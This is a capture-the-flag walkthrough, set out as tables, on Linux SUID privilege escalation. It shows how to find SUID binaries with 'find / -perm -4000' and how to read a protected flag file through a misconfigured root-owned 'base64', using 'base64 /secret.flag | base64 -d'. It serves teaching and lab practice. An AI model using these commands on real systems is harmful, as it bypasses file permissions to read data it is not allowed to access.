# SUID Exploitation — Cognitive Task Analysis

> You are logged in as `attacker`. There is a file `/secret.flag` owned by `not_adam` you cannot read directly. There is a misconfigured SUID binary on the system. How do you read the flag?

---

## Goal

| overall goal |
|---|
| Read `/secret.flag` (owned by `not_adam`, mode `600`) without being `not_adam` or `root` |

---

## Subgoals

| **Subgoal 1** | **Subgoal 2** | **Subgoal 3** |
|---|---|---|
| **Confirm you can't read it directly** | **Find a SUID binary that reads files** | **Use it to extract the flag** |
| `cat /secret.flag` → Permission denied | `find / -perm -4000 -type f 2>/dev/null` | `base64 /secret.flag \| base64 -d` |

---

## Decisions

| # | question | answer |
|---|----------|--------|
| 1 | Can I read the file directly? | No — `chmod 600`, owned by `not_adam` |
| 2 | What does SUID mean? | The binary runs as its *owner* (root), not as you |
| 3 | Which SUID binaries can read arbitrary files? | `base64` — it reads a file and prints it |
| 4 | Why pipe through `base64 -d`? | The output is encoded — decode it to get plaintext |
| 5 | How do I confirm the binary is actually SUID? | `ls -la $(which base64)` — look for `s` in `rws` |

---

## Reading the Permission String

| character(s) | meaning | what to look for |
|---|---|---|
| `-` | regular file (not symlink) | first character must be `-` not `l` |
| `rws` | owner: read, write, **SUID execute** | `s` instead of `x` = SUID set |
| `r-x` | group: read, execute | |
| `r-x` | other: read, execute | |
| owner = `root` | binary runs as root when executed | confirmed by `root root` in `ls -la` |

Example: `-rwsr-xr-x 1 root root 16234 ... /bin/base64` ✅

---

## Actions — In Order

| step | action | detail |
|------|--------|--------|
| 01 | Confirm you can't read directly | `cat /secret.flag` → expect `Permission denied` |
| 02 | Find SUID binaries | `find / -perm -4000 -type f 2>/dev/null` |
| 03 | Spot `base64` in the list | look for `/bin/base64` or `/usr/local/bin/base64` |
| 04 | Confirm SUID is set | `ls -la $(which base64)` — check for `rws` and owner `root` |
| 05 | Encode the flag file | `base64 /secret.flag` |
| 06 | Decode the output | `base64 /secret.flag \| base64 -d` |
| 07 | Read the flag | output should be `ctf{...}` |

---

## The Full Command

```sh
base64 /secret.flag | base64 -d
```

---

## Normal vs SUID Mental Model

| normal execution | SUID execution |
|---|---|
| program runs as *you* (`attacker`) | program runs as *owner* (`root`) |
| you can only read files you have permission for | root can read any file |
| `cat /secret.flag` → denied | `base64 /secret.flag` → succeeds |
| permissions enforced against your UID | permissions enforced against owner's UID |
| `ls -la` shows `rwx` | `ls -la` shows `rws` |

---

## Common Errors

| ⚠️ error | ✅ fix |
|---|---|
| `Permission denied` on `base64` itself | Binary isn't SUID — find the right one with `find / -perm -4000` |
| Output is garbled base64, not plaintext | Pipe through `\| base64 -d` to decode |
| `base64: /secret.flag: Permission denied` | You're running the wrong `base64` — check `which base64` |
| `ls` shows `l` at start of permissions | That's a symlink — SUID on a symlink is ignored, find the real binary |
| ✅ rule of thumb | `s` in `rws` = SUID set; `x` in `rwx` = not set. Owner must be `root` for privilege escalation. |